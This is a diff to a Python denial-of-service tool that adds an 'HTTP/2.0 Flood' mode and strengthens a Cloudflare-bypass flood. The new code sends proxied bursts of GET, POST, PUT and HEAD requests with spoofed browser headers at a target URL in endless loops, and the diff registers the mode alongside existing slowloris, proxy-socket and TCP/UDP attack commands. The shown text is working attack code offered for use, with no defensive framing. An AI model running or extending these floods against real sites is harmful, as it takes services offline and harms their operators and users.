@@ -1,5 +1,8 @@
 # -*- coding: utf-8 -*-
 from os import system, name
+import httpx
+#import asyncio
+from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
@@ -388,7 +391,7 @@ def LaunchPXRAW(url, th, t):
             pass
 
 def AttackPXRAW(url, until_datetime):
-    socksCrawler()
+
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         proxy = 'http://'+str(random.choice(list(proxies)))
         proxy = {
@@ -495,9 +498,11 @@ def LaunchCFB(url, th, t):
 
 def AttackCFB(url, until_datetime, scraper):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+     for _ in range(100):
         try:
-            scraper.get(url, timeout=15)
-            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=5)
+            scraper.post(url, timeout=5)
+            scraper.head(url, timeout=5)
         except:
             pass
 #endregion
@@ -506,7 +511,7 @@ def AttackCFB(url, until_datetime, scraper):
 def LaunchPXCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
-    socksCrawler()
+
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
@@ -610,11 +615,12 @@ def AttackCFSOC(until_datetime, target, req):
         except:
             packet.close()
             pass
+
 #slowloris
 def attackslow(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=Launchslow, args=(url, timer)).start()
-
+        
 def Launchslow(url, timer):
     prox = open("./socks5.txt", 'r').read().split('\n')
     proxy = random.choice(prox).strip().split(":")
@@ -648,6 +654,46 @@ def Launchslow(url, timer):
         except:
             s.close()
             Launchslow()
+#http2
+def attackhttp2(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=Launchhttp2, args=(url, timer)).start()
+
+def Launchhttp2(url, timer):
+        timelol = time.time() + int(timer)
+        while time.time() < timelol:
+            headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+ #           'TE': 'trailers',
+            }
+            proxfile1 = 'http.txt'
+            prox1 = list(map(lambda x:x.strip(),open(proxfile1)))
+            value = random.randint(65565, 314159)
+            proxy1 = random.choice(prox1)
+            proxies = ['http://'+proxy1]
+  #          timeout = httpx.Timeout(None, connect=None)
+    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
+            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
+                try:
+                    while True:
+                        for _ in range(400):
+                            r1 = client.get(url)
+                            r2 = client.post(url, data={'login': value})
+                            r3 = client.put(url, data={'login': value})
+                            r5 = client.head(url)
+                except httpx.HTTPError as exc:
+                   pass
 #region testzone
 def attackSKY(url, timer, threads):
     for i in range(int(threads)):
@@ -966,6 +1012,12 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "http2":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackhttp2, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()        
     elif command == "stellar":
         target, thread, t = get_info_l7()
         threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
@@ -1043,7 +1095,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxslow     "+Fore.RED+": "+Fore.WHITE+"Proxy Slowloris attack\n")
-    
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"http2     "+Fore.RED+": "+Fore.WHITE+"HTTP/2.0 Flood\n")
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
